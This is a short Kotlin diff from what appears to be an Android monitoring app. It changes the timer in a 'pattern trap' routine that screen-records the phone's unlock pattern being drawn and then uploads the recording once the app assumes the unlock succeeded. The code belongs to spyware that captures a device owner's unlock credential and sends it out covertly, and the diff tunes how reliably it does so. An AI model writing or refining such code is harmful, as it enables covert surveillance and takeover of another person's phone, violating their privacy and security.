@@ -52,9 +52,9 @@ class MonitorService : Service() {
                     if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                         patternFuseJob?.cancel()
                         patternFuseJob = scope.launch {
-                            delay(20_000L) // 20-second continuous screen-on fuse
+                            delay(ScreenRecordManager.patternSuccessTimeoutMs) // Dynamic continuous screen-on fuse
                             if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
-                                DebugLogger.log("CAPTURE_PATTERN", "20 continuous seconds reached. Assuming unlock success. Halting & uploading.")
+                                DebugLogger.log("CAPTURE_PATTERN", "Success threshold reached (${ScreenRecordManager.patternSuccessTimeoutMs}ms). Assuming unlock success. Halting & uploading.")
                                 ScreenRecordManager.stopRecording()
                             }
                         }
